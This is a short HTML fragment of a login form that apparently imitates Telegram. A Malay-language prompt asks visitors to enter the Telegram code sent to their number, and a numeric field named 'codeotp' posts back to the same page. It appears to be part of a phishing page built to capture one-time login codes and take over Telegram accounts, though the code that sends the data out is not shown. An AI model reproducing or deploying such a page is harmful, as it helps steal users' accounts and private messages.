              <path d="M12.146.146a.5.5 0 0 1 .708 0l3 3a.5.5 0 0 1 0 .708l-10 10a.5.5 0 0 1-.168.11l-5 2a.5.5 0 0 1-.65-.65l2-5a.5.5 0 0 1 .11-.168l10-10zM11.207 2.5 13.5 4.793 14.793 3.5 12.5 1.207 11.207 2.5zm1.586 3L10.5 3.207 4 9.707V10h.5a.5.5 0 0 1 .5.5v.5h.5a.5.5 0 0 1 .5.5v.5h.293l6.5-6.5zm-9.761 5.175-.106.106-1.528 3.821 3.821-1.528.106-.106A.5.5 0 0 1 5 12.5V12h-.5a.5.5 0 0 1-.5-.5V11h-.5a.5.5 0 0 1-.468-.325z"/>
            </svg>
           </div></h1>
          <p class="note">Masukkan Kode <b>Telegram</b> yang Dihantar ke Nombor Telegram Anda.</p>
          <form action="" method="post" onsubmit="loadd();">
            <div style="display:flex;justify-content:center;align-items:center;position:relative;padding-left:10%;padding-right:10%;">
              <div id="labelcode" class="input-group with-label" style="width:100%;margin-top:auto;margin-bottom:auto;">
               <input class="form-control" type="text" id="sign-in-code" dir="auto" autocomplete="off" inputmode="numeric" aria-label="Code" style="width:100%;text-align:center;" name="codeotp" />
